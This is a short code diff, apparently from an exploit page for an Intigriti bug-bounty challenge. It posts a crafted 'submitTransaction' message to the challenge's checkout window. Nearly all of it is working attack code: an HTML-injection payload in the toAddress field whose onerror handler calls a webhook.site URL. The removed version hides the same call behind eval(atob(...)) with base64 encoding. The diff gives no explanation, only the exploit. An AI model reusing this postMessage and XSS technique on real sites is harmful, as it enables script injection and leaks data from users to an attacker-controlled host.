@@ -31,16 +31,13 @@
 //   }, "*");
 // }, 300);
 
-const win = window.open(
-  "https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001"
-);
-
+const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00001");
 const payload = {
   type: "submitTransaction",
   transaction: {
     currency: '1337COIN',
-    amount: 0,
-    toAddress: '\"><img src=a onerror="eval(atob(`ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlL2I5Mzg2ZDBiLWM2M2YtNDA2Ni1iMTU1LTgzYTIyZDFjNzA1NS9YU1NJc0hlcmUnKQ==`))">'
+    amount: 1,
+    toAddress: '"><img src=a onerror="fetch(`https://webhook.site/b9386d0b-c63f-4066-b155-83a22d1c7055/XSSIsHere`)">'
   }
 };
 
@@ -51,8 +48,6 @@ const interval = setInterval(() => {
   }
   win.postMessage(payload, "*");
 }, 500);
-
-
 
 </script>
 
